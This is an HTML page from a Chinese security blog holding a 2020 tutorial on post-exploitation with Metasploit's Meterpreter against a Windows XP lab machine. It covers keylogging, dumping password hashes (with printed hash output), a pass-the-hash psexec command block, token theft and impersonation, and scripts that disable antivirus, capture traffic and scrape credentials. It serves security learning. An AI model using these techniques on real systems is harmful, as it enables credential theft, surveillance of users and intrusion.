@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>meterpreter基本使用 | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">meterpreter基本使用</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 27, 2020&nbsp;&nbsp;19:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>meterpreter是Metasploit框架的一个扩展模块，可以调用Metasploit的一些功能，对目标系统进行更为深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等等</p>
+<p>介绍meterpreter功能特性之前首先攻陷一台系统并取得一个Meterpreter shell，然后再利用meterpreter作为攻击载荷，展示它在进入目标系统后的一些其他攻击方法和技术，这里展示xp，攻击过程前一篇已经写过不再赘述，直接到达取得Meterpreter shell界面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727111047.png" alt=""></p>
+<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p><strong>screenshot</strong>：获取目标系统活动用户的桌面截图并保存至攻击机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727134346.png" alt=""></p>
+<p><strong>sysinfo</strong>：获取系统运行的平台</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727134450.png" alt=""></p>
+<p><strong>ps</strong>：获取目标系统正在运行的进程</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727134728.png" alt=""></p>
+<p><strong>获取键盘记录</strong></p>
+<p>使用migrate命令将会话迁移至explorer.exe的进程空间中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727135047.png" alt=""></p>
+<p>启动keylog_recoder模块，一段时间后使用ctrl+v终止</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727135253.png" alt=""></p>
+<p>可以看到记录被保存在了txt文件中，内容正是记录期间目标靶机的键盘使用记录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727135811.png" alt=""></p>
+<h3 id="挖掘用户名和密码"><a href="#挖掘用户名和密码" class="headerlink" title="挖掘用户名和密码"></a>挖掘用户名和密码</h3><p>除了上述键盘记录可以获取用户密码等敏感信息之外，Meterpreter也可以获取系统本地文件中的用户名和密码</p>
+<h4 id="获取密码哈希值"><a href="#获取密码哈希值" class="headerlink" title="获取密码哈希值"></a>获取密码哈希值</h4><p>使用<code>use priv</code>命令，意味着运行在特权账户上，使用<code>hashdump</code>命令可以获取目标系统所有的用户名和密码哈希值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727140617.png" alt=""></p>
+<h4 id="传递哈希值"><a href="#传递哈希值" class="headerlink" title="传递哈希值"></a>传递哈希值</h4><p>虽然我们提取到了用户名和密码的哈希值，但如果密码设置复杂，我们就不能在可接受的时间内将明文密码破解出来。如果不知道明文密码，如何通过这个用户账号登录到更多的主机呢。</p>
+<p>这里将用到哈希传递技术，仅仅有密码的哈希值就够了，而不需要将密码明文，Metasploit的<code>windows/smb/psexec</code>模块就可以实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec </span><br><span class="line">show options</span><br><span class="line">set RHOST 192.168.48.134</span><br><span class="line">set LHOST 192.168.48.128</span><br><span class="line">set LPORT 443</span><br><span class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h4 id="令牌假冒"><a href="#令牌假冒" class="headerlink" title="令牌假冒"></a>令牌假冒</h4><p>使用ps可以看到目标靶机的进程以及运行这些应用的用户账号</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727190150.png" alt=""></p>
+<p>使用<code>steal_token</code>命令和PID参数来盗取管理员用户的令牌</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727190636.png" alt=""></p>
+<p>现在Metasploit是以管理员用户来运行的了。</p>
+<p>有时候ps不能列出域管理员运行的进程，我们可以使用<code>incognito</code>命令列举出系统上可以利用的令牌</p>
+<p>通过<code>use incognito</code>命令加载incognito模块，然后通过<code>list_token -u</code>命令列举出令牌</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727191029.png" alt=""></p>
+<p>然后使用<code>impersonate_token</code>命令扮演令牌，注意这里要用两个斜杠</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727191212.png" alt=""></p>
+<p>现在就成功假冒为管理员并具有相应权限了。</p>
+<h3 id="使用Metasploit脚本"><a href="#使用Metasploit脚本" class="headerlink" title="使用Metasploit脚本"></a>使用Metasploit脚本</h3><p>通过<code>run [name]</code>命令可以在Meterpreter终端中执行扩展脚本，下面列出几个常用脚本</p>
+<p><strong>run vnc</strong>：将受控系统的桌面通信通过隧道方式映射过来，使得你可以访问到图形化桌面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727201813.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727201848.png" alt=""></p>
+<p><strong>run  post/windows/manage/migrate</strong>：将Metasploit会话迁移至内存空间的其他稳定的，不会被关闭的服务进程中，以维持稳定的系统控制连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727202151.png" alt=""></p>
+<p><strong>run killav</strong>：可以关闭某些智能化防毒软件和主机入侵防御产品</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727202421.png" alt=""></p>
+<p><strong>run hashdump</strong>：获取密码哈希值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump </span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY a4a0fd97de24e4ad0028b54c7dd055d0...</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;rex&#x2F;script&#x2F;base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;rex&#x2F;script&#x2F;base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;rex&#x2F;script&#x2F;base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;rex&#x2F;script&#x2F;base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HelpAssistant:1000:b3d8d3ca5e354eb1eee90cccd2029f2d:99418b20ca08597feaadf1959619e0a2:::</span><br><span class="line">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:2098344bc829d0d369d7d324bf8eb16c:::</span><br><span class="line">blacknight:1005:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>
+
+<p><strong>run packetrecorder -i 1</strong>：查看目标机的所有流量</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727202711.png" alt=""></p>
+<p><strong>run scraper</strong>：scraper可以列举出系统上的绝大部分信息，可以获取用户名和密码，下载全部注册表，挖掘密码哈希值，收集系统信息等等</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727203131.png" alt=""></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/07/27/msf_note4/">http://www.blacknight.top/2020/07/27/msf_note4/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/metasploit/"># metasploit</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/07/26/msf_note3/">metasploit渗透实例</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
